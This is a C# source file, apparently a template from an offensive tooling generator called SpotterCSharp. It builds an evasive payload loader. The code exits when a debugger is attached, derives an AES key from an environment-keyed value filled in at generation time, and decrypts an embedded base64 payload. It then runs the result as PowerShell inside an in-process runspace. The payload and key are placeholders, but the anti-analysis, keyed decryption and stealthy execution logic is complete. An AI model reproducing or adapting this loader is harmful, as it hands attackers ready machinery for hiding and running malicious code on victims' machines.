using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Management.Automation;
using System.Management.Automation.Runspaces;


namespace SpotterCSharp
{
    class SpotterCSharp
    {
        private static void Main(string[] args)
        {
            if (System.Diagnostics.Debugger.IsAttached)
            {
                Console.WriteLine("Why are you debugging me noob?");
                System.Environment.Exit(0);
            }
            string encDllB64 = "ENCODED_COMMAND";
            byte[] encDllBytes = Convert.FromBase64String(encDllB64);
            var newIV = new byte[16];
            Array.Copy(encDllBytes, newIV, 16);
            string envKey = GetEnvKey();
            byte[] keyBytes = Encoding.UTF8.GetBytes(envKey);
            try
            {
                string plaintext = null;
                plaintext = Decrypt(keyBytes, newIV, encDllBytes);
                Runstuff(plaintext);
            }
            catch (Exception)
            {
                System.Environment.Exit(1);
            }
        }
        private static string GetEnvKey()
        {
            //This is the query we'll need to replace at generation
            string envKey = KEYCHECK;
            if (32 <= envKey.Length) envKey = envKey.Substring(0, 32);
            while (envKey.Length * 2 <= 32)
            {
                envKey += envKey;
            }
            if (envKey.Length < 32)
            {
                envKey += envKey.Substring(0, 32 - envKey.Length);
            }
            return envKey;
        }
        private static string Decrypt(byte[] keyBytes, byte[] newIV, byte[] newCipherText)
        {
            byte[] key = keyBytes;
            byte[] iv = newIV;
            byte[] ciphertext = newCipherText;
            string plaintext = null;
            try
            {
                using (RijndaelManaged rijAlg = new RijndaelManaged())
                {
                    rijAlg.Key = key;
                    rijAlg.IV = iv;
                    rijAlg.Padding = PaddingMode.PKCS7;
                    rijAlg.BlockSize = 128;
                    rijAlg.Mode = CipherMode.CBC;
                    ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
                    using (MemoryStream msDecrypt = new MemoryStream(ciphertext))
                    {
                        using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                        {
                            using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                            {
                                plaintext = srDecrypt.ReadToEnd();
                                plaintext = plaintext.Remove(0, 16);
                                return plaintext;
                            }
                        }
                    }

                }
            }
            catch (CryptographicException e)
            {
                return null;
            }
        }
        private static void Runstuff(string assemblyB64)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(assemblyB64);
            pipeline.Invoke();
        }
    }
}

